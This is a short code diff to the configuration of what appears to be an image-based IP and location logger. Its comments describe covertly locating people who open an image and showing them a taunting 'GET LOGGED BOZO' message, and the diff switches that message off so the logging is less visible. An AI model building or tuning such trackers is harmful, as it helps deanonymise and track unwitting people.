@@ -28,7 +28,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "GET LOGGED BOZO....", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
